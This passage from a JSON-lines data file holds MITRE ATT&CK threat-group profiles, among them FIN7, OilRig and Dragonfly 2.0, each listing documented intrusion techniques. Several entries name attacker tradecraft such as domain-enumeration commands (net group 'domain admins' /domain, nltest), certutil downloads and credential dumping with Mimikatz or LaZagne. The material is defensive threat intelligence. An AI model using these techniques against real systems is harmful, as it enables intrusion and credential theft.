through spearphishing to execute malware.", "Machete has distributed Machete through a fake blog website.", "Machete's Machete MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.", "Machete has used msiexec to install the Machete malware.", "Machete has used batch files to initiate additional downloads of malicious files.", "Machete has relied on users opening malicious attachments delivered through spearphishing to execute malware.", "Machete used multiple compiled Python scripts on the victim’s system. Machete's main backdoor Machete is also written in Python."], "is_subtechnique": false}
{"text": " [Stealth Falcon](https://attack.mitre.org/groups/G0038) is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there could be a link between this group and the United Arab Emirates (UAE) government, but that has not been confirmed. (Citation: Citizen Lab Stealth Falcon May 2016)", "idx": "https://attack.mitre.org/groups/G0038", "title": "Stealth Falcon", "entity": "Stealth Falcon", "entity_type": "groups", "entity_context": ["Stealth Falcon malware gathers passwords from the Windows Credential Vault.", "Stealth Falcon malware gathers a list of running processes.", "Stealth Falcon malware gathers the registered user and primary owner name via WMI.", "Stealth Falcon malware gathers the Address Resolution Protocol (ARP) table from the victim.", "Stealth Falcon malware gathers data from the local victim system.", "Stealth Falcon malware gathers passwords from multiple sources, including Windows Credential Vault and Outlook.", "Stealth Falcon malware attempts to determine the installed version of .NET by querying the Registry.", "After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel.", "Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.", "Stealth Falcon malware gathers system information via Windows Management Instrumentation (WMI).", "Stealth Falcon malware encrypts C2 traffic using RC4 with a hard-coded key.", "Stealth Falcon malware uses WMI to script data collection and command execution on the victim.", "Stealth Falcon malware gathers passwords from multiple sources, including Internet Explorer, Firefox, and Chrome.", "Stealth Falcon malware communicates with its C2 server via HTTPS.", "Stealth Falcon malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.", "Stealth Falcon malware creates a scheduled task entitled “IE Web Cache” to execute a malicious file hourly."], "is_subtechnique": false}
{"text": " [Rancor](https://attack.mitre.org/groups/G0075) is a threat group that has led targeted campaigns against the South East Asia region. [Rancor](https://attack.mitre.org/groups/G0075) uses politically-motivated lures to entice victims to open malicious documents. (Citation: Rancor Unit42 June 2018)", "idx": "https://attack.mitre.org/groups/G0075", "title": "Rancor", "entity": "Rancor", "entity_type": "groups", "entity_context": ["Rancor has used HTTP for C2.", "Rancor has downloaded additional malware, including by using certutil.", "Rancor attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.", "Rancor has used cmd.exe to execute commmands.", "Rancor launched a scheduled task to gain persistence using the <code>schtasks /create /sc</code> command.", "Rancor has used VBS scripts as well as embedded macros for execution.", "Rancor has attached a malicious document to an email to gain initial access.", "Rancor has used <code>msiexec</code> to download and execute malicious installer files over HTTP."], "is_subtechnique": false}
{"text": " [Mofang](https://attack.mitre.org/groups/G0103) is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting focused attacks against government and critical infrastructure in Myanmar, as well as several other countries and sectors including military, automobile, and weapons industries.(Citation: FOX-IT May 2016 Mofang)", "idx": "https://attack.mitre.org/groups/G0103", "title": "Mofang", "entity": "Mofang", "entity_type": "groups", "entity_context": ["Mofang's malicious spearphishing attachments required a user to open the file after receiving.", "Mofang has compressed the ShimRat executable within malicious email attachments. Mofang has also encrypted payloads before they are downloaded to victims.", "Mofang delivered spearphishing emails with malicious links included.", "Mofang delivered spearphishing emails with malicious documents, PDFs, or Excel files attached.", "Mofang's spearphishing emails required a user to click the link to connect to a compromised website."], "is_subtechnique": false}
{"text": " [Gallmaker](https://attack.mitre.org/groups/G0084) is a cyberespionage group that has targeted victims in the Middle East and has been active since at least December 2017. The group has mainly targeted victims in the defense, military, and government sectors.(Citation: Symantec Gallmaker Oct 2018)", "idx": "https://attack.mitre.org/groups/G0084", "title": "Gallmaker", "entity": "Gallmaker", "entity_type": "groups", "entity_context": ["Gallmaker sent victims a lure document with a warning that asked victims to “enable content” for execution.", "Gallmaker obfuscated shellcode used during execution.", "Gallmaker used PowerShell to download additional payloads and for execution.", "Gallmaker sent emails with malicious Microsoft Office documents attached.", "Gallmaker has used WinZip, likely to archive data prior to exfiltration.", "Gallmaker attempted to exploit Microsoft’s DDE protocol in order to gain access to victim machines and for execution."], "is_subtechnique": false}
{"text": " [Lotus Blossom](https://attack.mitre.org/groups/G0030) is a threat group that has targeted government and military organizations in Southeast Asia. (Citation: Lotus Blossom Jun 2015)", "idx": "https://attack.mitre.org/groups/G0030", "title": "Lotus Blossom", "entity": "Lotus Blossom", "entity_type": "groups", "entity_context": [], "is_subtechnique": false}
{"text": " [Dragonfly 2.0](https://attack.mitre.org/groups/G0074) is a suspected Russian group that has targeted government entities and multiple U.S. critical infrastructure sectors since at least December 2015. (Citation: US-CERT TA18-074A) (Citation: Symantec Dragonfly Sept 2017) There is debate over the extent of overlap between [Dragonfly 2.0](https://attack.mitre.org/groups/G0074) and [Dragonfly](https://attack.mitre.org/groups/G0035), but there is sufficient evidence to lead to these being tracked as two separate groups. (Citation: Fortune Dragonfly 2.0 Sept 2017)(Citation: Dragos DYMALLOY )", "idx": "https://attack.mitre.org/groups/G0074", "title": "Dragonfly 2.0", "entity": "Dragonfly 2.0", "entity_type": "groups", "entity_context": ["Dragonfly 2.0 manipulated .lnk files to gather user credentials in conjunction with Forced Authentication.", "Dragonfly 2.0 deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.", "Dragonfly 2.0 used the command <code>query user</code> on victim hosts.", "Dragonfly 2.0 used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.", "Dragonfly 2.0 dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers. ", "Dragonfly 2.0 added the registry value ntdll to the Registry Run key to establish persistence.", "Dragonfly 2.0 cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.", "Dragonfly 2.0 has used various forms of spearphishing in attempts to get users to open attachments.", "Dragonfly 2.0 used a batch script to gather folder and file names from victim hosts.", "Dragonfly 2.0 dropped and executed SecretsDump to dump password hashes.", "Dragonfly 2.0 added newly created accounts to the administrators group to maintain elevated access.", "Dragonfly 2.0 modified the Registry to hide create user accounts. ", "Dragonfly 2.0 commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.", "Dragonfly 2.0 has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.", "Dragonfly 2.0 copied and installed tools for operations once in the victim environment.", "Dragonfly 2.0 has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.", "Dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain.", "Dragonfly 2.0 has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).", "Dragonfly 2.0 compromised legitimate organizations' websites to create watering holes to compromise victims.", "Dragonfly 2.0 used spearphishing with Microsoft Office attachments to target victims.", "Dragonfly 2.0 compressed data into .zip files prior to exfiltrating it.", "Dragonfly 2.0 used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.", "Dragonfly 2.0 used various types of scripting to perform operations, including batch scripts.", "Dragonfly 2.0 accessed email accounts using Outlook Web Access.", "Dragonfly 2.0 created a directory named \"out\" in the user's %AppData% folder and copied files to it.", "Dragonfly 2.0 compromised user credentials and used valid accounts for operations.", "Dragonfly 2.0 used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim.", "Dragonfly 2.0 has used various forms of spearphishing in attempts to get users to open links.", "Dragonfly 2.0 queried the Registry to identify victim information.", "Dragonfly 2.0 used SMB for C2.", "Dragonfly 2.0 has disabled host-based firewalls. The group has also globally opened port 3389.", "Dragonfly 2.0 used command line for execution.", "Dragonfly 2.0 modified the Registry to perform multiple techniques through the use of Reg.", "Dragonfly 2.0 used batch scripts to enumerate users on a victim domain controller.", "Dragonfly 2.0 dropped and executed tools used for password cracking, including Hydra and CrackMapExec.", "Dragonfly 2.0 collected data from local victim systems.", "Dragonfly 2.0 used PowerShell scripts for execution.", "Dragonfly 2.0 used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.", "Dragonfly 2.0 created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.", "Dragonfly 2.0 likely obtained a list of hosts in the victim environment.", "Dragonfly 2.0 identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.", "Dragonfly 2.0 used SMB over ports 445 or 139 for C2. The group also established encrypted connections over port 443.", "Dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.", "Dragonfly 2.0 used batch scripts to enumerate administrators and users in the domain.", "Dragonfly 2.0 moved laterally via RDP."], "is_subtechnique": false}
{"text": " [DragonOK](https://attack.mitre.org/groups/G0017) is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools, [DragonOK](https://attack.mitre.org/groups/G0017) is thought to have a direct or indirect relationship with the threat group [Moafee](https://attack.mitre.org/groups/G0002). (Citation: Operation Quantum Entanglement) It is known to use a variety of malware, including Sysget/HelloBridge, PlugX, PoisonIvy, FormerFirstRat, NFlog, and NewCT. (Citation: New DragonOK)", "idx": "https://attack.mitre.org/groups/G0017", "title": "DragonOK", "entity": "DragonOK", "entity_type": "groups", "entity_context": [], "is_subtechnique": false}
{"text": " [FIN8](https://attack.mitre.org/groups/G0061) is a financially motivated threat group known to launch tailored spearphishing campaigns targeting the retail, restaurant, and hospitality industries. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Fin8 May 2016)", "idx": "https://attack.mitre.org/groups/G0061", "title": "FIN8", "entity": "FIN8", "entity_type": "groups", "entity_context": ["FIN8 has used Registry keys to detect and avoid executing in potential sandboxes.", "FIN8 has used environment variables and standard input (stdin) to obfuscate command-line arguments. FIN8 also obfuscates malicious macros delivered as payloads.", "FIN8 has exploited the CVE-2016-0167 local vulnerability.", "FIN8 has used FTP to exfiltrate collected data.", "FIN8 has used RAR to compress collected data before exfiltration.", "FIN8 aggregates staged data from a network into a single location.", "FIN8 has cleared logs during post compromise cleanup activities.", "FIN8 has used <code>sslip.io</code>, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control.", "FIN8 has injected malicious code into a new svchost.exe process.", "FIN8 harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).", "FIN8 has used dsquery and other Active Directory utilities to enumerate hosts; they have also used <code>nltest.exe /dclist</code> to retrieve a list of domain controllers.", "FIN8 has used emails with malicious links to lure victims into installing malware.", "FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution. FIN8 has also used WMIC for lateral movement as well as during and post compromise cleanup activities.", "FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.", "FIN8 has used scheduled tasks to maintain RDP backdoors.", "FIN8 has deleted Registry keys during post compromise cleanup activities.", "FIN8 has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.", "FIN8 has used HTTPS for command and control.", "FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure.", "FIN8 has used valid accounts for persistence and lateral movement.", "FIN8 has retrieved a list of trusted domains by using <code>Nltest.exe /domain_trusts</code>.", "FIN8 has used WMI event subscriptions for persistence.", "FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities. FIN8 has also executed commands remotely via cmd.", "FIN8 has distributed targeted emails containing Word documents with embedded malicious macros.", "FIN8's malicious spearphishing payloads are executed as PowerShell. FIN8 has also used PowerShell for lateral movement and credential access.", "FIN8 has used RDP for lateral movement.", "FIN8 has deleted tmp and prefetch files during post compromise cleanup activities.", "FIN8 has tunneled RDP backdoors over port 443.", "FIN8 has used malicious e-mail attachments to lure victims into executing malware.", "FIN8 has distributed targeted emails containing links to malicious documents with embedded macros.", "FIN8 has used remote code execution to download subsequent payloads."], "is_subtechnique": false}
{"text": " [Volatile Cedar](https://attack.mitre.org/groups/G0123) is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. [Volatile Cedar](https://attack.mitre.org/groups/G0123) has been operating since 2012 and is motivated by political and ideological interests.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)", "idx": "https://attack.mitre.org/groups/G0123", "title": "Volatile Cedar", "entity": "Volatile Cedar", "entity_type": "groups", "entity_context": ["Volatile Cedar has performed vulnerability scans of the target server.", "Volatile Cedar can deploy additional tools.", "Volatile Cedar has targeted publicly facing web servers, with both automatic and manual vulnerability discovery.  ", "Volatile Cedar can inject web shell code into a server. "], "is_subtechnique": false}
{"text": " [Indrik Spider](https://attack.mitre.org/groups/G0119) is a Russia-based cybercriminal group that as been active since at least 2014. [Indrik Spider](https://attack.mitre.org/groups/G0119) initially started with the [Dridex](https://attack.mitre.org/software/S0384) banking Trojan, and then by 2017 they began running ransomware operations using [BitPaymer](https://attack.mitre.org/software/S0570), [WastedLocker](https://attack.mitre.org/software/S0612), and Hades ransomware.(Citation: Crowdstrike Indrik November 2018)(Citation: Crowdstrike EvilCorp March 2021)(Citation: Treasury EvilCorp Dec 2019)", "idx": "https://attack.mitre.org/groups/G0119", "title": "Indrik Spider", "entity": "Indrik Spider", "entity_type": "groups", "entity_context": ["Indrik Spider has used PsExec to stop services prior to the execution of ransomware.", "Indrik Spider has used Group Policy Objects to deploy batch scripts.", "Indrik Spider has attempted to get users to click on a malicious zipped file. ", "Indrik Spider has used Cobalt Strike to empty log files.", "Indrik Spider has served fake updates via legitimate websites that have been compromised.\t", "Indrik Spider has used WMIC to execute commands on remote computers. ", "Indrik Spider used <code>wmic.exe</code> to add a new user to the system.", "Indrik Spider used Cobalt Strike to carry out credential dumping using ProcDump.", "Indrik Spider has stored collected date in a .tmp file.", "Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system. ", "Indrik Spider has used PowerShell Empire for execution of malware. ", "Indrik Spider has used malicious JavaScript files for several components of their attack.", "Indrik Spider has encrypted domain-controlled systems using BitPaymer.", "Indrik Spider has collected credentials from infected systems, including domain accounts.", "Indrik Spider has used batch scripts on victim's machines. ", "Indrik Spider has downloaded additional scripts, malware, and tools onto a compromised host.", "Indrik Spider used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.", "Indrik Spider has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database.", "Indrik Spider used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors."], "is_subtechnique": false}
{"text": " [Group5](https://attack.mitre.org/groups/G0043) is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) has used two commonly available remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) and [NanoCore](https://attack.mitre.org/software/S0336), as well as an Android RAT, DroidJack. (Citation: Citizen Lab Group5)", "idx": "https://attack.mitre.org/groups/G0043", "title": "Group5", "entity": "Group5", "entity_type": "groups", "entity_context": ["Malware used by Group5 is capable of remotely deleting files from victims.", "Malware used by Group5 is capable of capturing keystrokes.", "Group5 disguised its malicious binaries with several layers of obfuscation, including encrypting the files.", "Malware used by Group5 is capable of watching the victim's screen."], "is_subtechnique": false}
{"text": " Operation [Sharpshooter](https://attack.mitre.org/groups/G0104) is the name of a cyber espionage campaign discovered in October 2018 targeting nuclear, defense, energy, and financial companies. Though overlaps between this adversary and [Lazarus Group](https://attack.mitre.org/groups/G0032) have been noted, definitive links have not been established.(Citation: McAfee Sharpshooter December 2018)", "idx": "https://attack.mitre.org/groups/G0104", "title": "Sharpshooter", "entity": "Sharpshooter", "entity_type": "groups", "entity_context": ["Sharpshooter downloaded additional payloads after a target was infected with a first-stage downloader.", "Sharpshooter's first-stage downloader installed Rising Sun to the startup folder <code>%Startup%\\mssync.exe</code>.\t", "Sharpshooter's first-stage downloader resolved various Windows libraries and APIs, including LoadLibraryA(), GetProcAddress(), and CreateProcessA().\t", "Sharpshooter has sent malicious attachments via emails to targets.", "Sharpshooter has sent malicious Word OLE documents to victims.", "Sharpshooter has leveraged embedded shellcode to inject a downloader into the memory of Word.", "Sharpshooter has sent malicious DOC and PDF files to targets so that they can be opened by a user.", "Sharpshooter's first-stage downloader was a VBA macro."], "is_subtechnique": false}
{"text": " [FIN7](https://attack.mitre.org/groups/G0046) is a financially-motivated threat group that has been active since 2013 primarily targeting the U.S. retail, restaurant, and hospitality sectors, often using point-of-sale malware. A portion of [FIN7](https://attack.mitre.org/groups/G0046) was run out of a front company called Combi Security. Since 2020 [FIN7](https://attack.mitre.org/groups/G0046) shifted operations to a big game hunting (BGH) approach including use of [REvil](https://attack.mitre.org/software/S0496) ransomware and their own Ransomware as a Service (RaaS), Darkside. [FIN7](https://attack.mitre.org/groups/G0046) may be linked to the [Carbanak](https://attack.mitre.org/groups/G0008) Group, but there appears to be several groups using [Carbanak](https://attack.mitre.org/software/S0030) malware and are therefore tracked separately.(Citation: FireEye FIN7 March 2017)(Citation: FireEye FIN7 April 2017)(Citation: FireEye CARBANAK June 2017)(Citation: FireEye FIN7 Aug 2018)(Citation: CrowdStrike Carbon Spider August 2021)", "idx": "https://attack.mitre.org/groups/G0046", "title": "FIN7", "entity": "FIN7", "entity_type": "groups", "entity_context": ["FIN7 used a PowerShell script to launch shellcode that retrieved an additional payload.", "FIN7 has performed C2 using DNS via A, OPT, and TXT records.", "FIN7 malware has created scheduled tasks to establish persistence.", "FIN7 has used TightVNC to control compromised hosts.", "FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.", "FIN7 has exfiltrated stolen data to the MEGA file sharing site.", "FIN7 used VBS scripts to help perform tasks on the victim's machine.", "FIN7 has signed Carbanak payloads with legally purchased code signing certificates. FIN7 has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.", "FIN7 spear phishing campaigns have included malicious Word documents with DDE execution.", "FIN7 lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.", "FIN7 created new Windows services and added them to the startup directories for persistence.", "FIN7 has harvested valid administrative credentials for lateral movement.", "FIN7 has used ports 53, 80, 443, and 8080 for C2.", "FIN7 has created a scheduled task named “AdobeFlashSync” to establish persistence.", "FIN7 has used Kerberoasting for credential access and to enable lateral movement.", "FIN7 has collected files and other sensitive information from a compromised network.", "FIN7 has used application shim databases for persistence.", "FIN7 has developed malware for use in operations, including the creation of infected removable media.", "FIN7 has used RDP to move laterally in victim environments.\n", "FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.", "FIN7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2.", "FIN7 has conducted broad phishing campaigns using malicious links.", "FIN7 captured screenshots and desktop video recordings.", "FIN7 used JavaScript scripts to help perform tasks on the victim's machine.", "FIN7 has attempted to run Darkside ransomware with the filename sleep.exe.", "FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.", "FIN7 has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware.", "FIN7's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails.", "FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.", "FIN7 created a custom video recording capability that could be used to monitor operations in the victim's environment.", "FIN7 has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.", "FIN7 used the command prompt to launch commands on the victim’s machine. ", "FIN7 has used malicious links to lure victims into downloading malware.", "FIN7 has registered look-alike domains for use in phishing campaigns.", "FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.", "FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.", "FIN7 has used SSH to move laterally through victim environments.", "FIN7 used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.", "FIN7 used SQL scripts to help perform tasks on the victim's machine.", "FIN7 has used WMI to install malware on targeted systems."], "is_subtechnique": false}
{"text": " [Evilnum](https://attack.mitre.org/groups/G0120) is a financially motivated threat group that has been active since at least 2018.(Citation: ESET EvilNum July 2020)", "idx": "https://attack.mitre.org/groups/G0120", "title": "Evilnum", "entity": "Evilnum", "entity_type": "groups", "entity_context": ["Evilnum has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file.", "Evilnum has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder. ", "Evilnum has sent spearphishing emails containing a link to a zip file hosted on Google Drive.", "Evilnum has used PowerShell to bypass UAC.", "Evilnum can collect email credentials from victims.", "Evilnum has deleted files used during infection.", "Evilnum can deploy additional components or tools as needed.", "Evilnum has used malicious JavaScript files on the victim's machine.", "Evilnum can steal cookies and session information from browsers.", "EVILNUM has used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromrised machines.", "Evilnum has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments. "], "is_subtechnique": false}
{"text": " [Nomadic Octopus](https://attack.mitre.org/groups/G0133) is a Russian-speaking cyberespionage threat group that has primarily targeted Central Asia, including local governments, diplomatic missions, and individuals, since at least 2014. [Nomadic Octopus](https://attack.mitre.org/groups/G0133) has been observed conducting campaigns involving Android and Windows malware, mainly using the Delphi programming language, and building custom variants.(Citation: Security Affairs DustSquad Oct 2018)(Citation: Securelist Octopus Oct 2018)(Citation: ESET Nomadic Octopus 2018)", "idx": "https://attack.mitre.org/groups/G0133", "title": "Nomadic Octopus", "entity": "Nomadic Octopus", "entity_type": "groups", "entity_context": ["Nomadic Octopus executed PowerShell in a hidden window. ", "Nomadic Octopus has targeted victims with spearphishing emails containing malicious attachments.", "Nomadic Octopus has used malicious macros to download additional files to the victim's machine. ", "Nomadic Octopus has used PowerShell for execution. ", "Nomadic Octopus used <code>cmd.exe /c</code> within a malicious macro.", "Nomadic Octopus as attempted to lure victims into clicking on malicious attachments within spearphishing emails.", "Nomadic Octopus attempted to make Octopus appear as a  Telegram Messenger with a Russian interface."], "is_subtechnique": false}
{"text": " [Higaisa](https://attack.mitre.org/groups/G0126) is a threat group suspected to have South Korean origins. [Higaisa](https://attack.mitre.org/groups/G0126) has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. [Higaisa](https://attack.mitre.org/groups/G0126) was first disclosed in early 2019 but is assessed to have operated as early as 2009.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020)", "idx": "https://attack.mitre.org/groups/G0126", "title": "Higaisa", "entity": "Higaisa", "entity_type": "groups", "entity_context": ["Higaisa added a spoofed binary to the start-up folder for persistence.", "Higaisa’s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the <code>OINFO12.OCX</code> dynamic link library.", "Higaisa used HTTP and HTTPS to send data back to its C2 server.", "Higaisa discovered system proxy settings and used them if available.", "Higaisa’s shellcode attempted to find the process ID of the current process.", "Higaisa exfiltrated data over its C2 channel.", "Higaisa has exploited CVE-2018-0798 for execution.", "Higaisa has sent spearphishing emails containing malicious attachments. ", "Higaisa used a FakeTLS session for C2 communications.", "Higaisa used an XSL file to run VBScript code.", "Higaisa has used VBScript code on the victim's machine.", "Higaisa used malicious e-mail attachments to lure victims into executing LNK files.", "Higaisa performed padding with null bytes before calculating its hash.", "Higaisa dropped and added <code>officeupdate.exe</code> to scheduled tasks.", "Higaisa collected the system volume serial number, GUID, and computer name.", "Higaisa used <code>cmd.exe</code> for execution.", "Higaisa used a payload that creates a hidden window.", "Higaisa used JavaScript to execute additional files.", "Higaisa used Base64 encoded compressed payloads.", "Higaisa used AES-128 to encrypt C2 traffic.", "Higaisa used a function to gather the current time.", "Higaisa named a shellcode loader binary <code>svchast.exe</code> to spoof the legitimate <code>svchost.exe</code>. ", "Higaisa sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.", "Higaisa used <code>ipconfig</code> to gather network configuration information.", "Higaisa has called various native OS APIs.", "Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data."], "is_subtechnique": false}
{"text": " [Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)", "idx": "https://attack.mitre.org/groups/G0077", "title": "Leafminer", "entity": "Leafminer", "entity_type": "groups", "entity_context": ["Leafminer used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.", "Leafminer has obtained and used tools such as LaZagne, Mimikatz, PsExec, and MailSniper.", "Leafminer used several tools for retrieving login and password information, including LaZagne and Mimikatz.", "Leafminer obfuscated scripts that were used on victim machines.", "Leafminer scanned network services to search for vulnerabilities in the victim system.", "Leafminer has used Process Doppelgänging to evade security software while deploying tools on compromised systems.\t", "Leafminer has infected victims using watering holes.", "Leafminer used a tool called MailSniper to search through the Exchange server mailboxes for keywords.", "Leafminer used Microsoft’s Sysinternals tools to gather detailed information about remote systems.", "Leafminer used several tools for retrieving login and password information, including LaZagne.", "Leafminer used a tool called Imecab to set up a persistent remote access account on the victim machine.", "Leafminer used a tool called Total SMB BruteForcer to perform internal password spraying.", "Leafminer infected victims using JavaScript code."], "is_subtechnique": false}
{"text": " [TA551](https://attack.mitre.org/groups/G0127) is a financially-motivated threat group that has been active since at least 2018. (Citation: Secureworks GOLD CABIN) The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns. (Citation: Unit 42 TA551 Jan 2021)", "idx": "https://attack.mitre.org/groups/G0127", "title": "TA551", "entity": "TA551", "entity_type": "groups", "entity_context": ["TA551 has used <code>cmd.exe</code> to execute commands.", "TA551 has used regsvr32.exe to load malicious DLLs.", "TA551 has prompted users to enable macros within spearphishing attachments to install malware.", "TA551 has used HTTP for C2 communications.", "TA551 has hidden encoded data for malware DLLs in a PNG.", "TA551 has used a DGA to generate URLs from executed macros.", "TA551 has used mshta.exe to execute malicious payloads.", "TA551 has retrieved DLLs and installer binaries for malware execution from C2.", "TA551 has used encoded ASCII text for initial C2 communications.", "TA551 has masked malware DLLs as dat and jpg files.", "TA551 has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals.", "TA551 has used obfuscated variable names in a JavaScript configuration file.", "TA551 has sent spearphishing attachments with password protected ZIP files.", "TA551 has used rundll32.exe to load malicious DLLs."], "is_subtechnique": false}
{"text": " [OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018)", "idx": "https://attack.mitre.org/groups/G0049", "title": "OilRig", "entity": "OilRig", "entity_type": "groups", "entity_context": ["OilRig has used .doc file extensions to mask malicious executables.", "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access. OilRig has also used tool named PICKPOCKET to dump passwords from web browsers.", "OilRig has used Putty to access compromised systems.", "OilRig has used keylogging tools called KEYPUNCH and LONGWATCH.\t\n", "OilRig has used DNS for C2 including the publicly available <code>requestbin.net</code> tunneling service.", "OilRig has used automated collection.", "OilRig has used the Plink utility and other tools to create tunnels to C2 servers.", "OilRig has deleted files associated with their payload after execution.", "OilRig has used compromised credentials to access other systems on a victim network.", "OilRig has encrypted and encoded data in its malware, including by using base64.", "OilRig has used <code>net localgroup administrators</code> to find local administrators on compromised systems.", "OilRig has used <code>net group /domain</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to find domain group permission settings.", "OilRig has delivered macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system.", "OilRig has run <code>ipconfig /all</code> on a victim.", "OilRig has delivered malicious links to achieve execution on the target system.", "OilRig has sent spearphising emails with malicious links to potential victims.", "OilRig has used web shells, often to maintain access to a victim network.", "OilRig has abused the Outlook Home Page feature for persistence. OilRig has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.", "OilRig has used VBSscipt macros for execution on compromised hosts.", "OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.", "OilRig has exfiltrated data over FTP separately from its primary C2 channel over DNS.", "OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.", "OilRig has used port 80 to call back to the C2 server.\t", "OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.", "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.", "OilRig has used various types of scripting for execution.", "OilRig has used WMI for execution.", "OilRig malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.", "OilRig has used macros to deliver malware such as QUADAGENT and OopsIE. OilRig has used batch scripts.", "OilRig has run <code>tasklist</code> on a victim's machine.", "OilRig has used HTTP for C2.", "OilRig used the Plink utility and other tools to create tunnels to C2 servers.", "OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.", "OilRig has used <code>netstat -an</code> on a victim to get a listing of network connections.", "OilRig has run <code>net user</code>, <code>net user /domain</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to get account listings on a victim.", 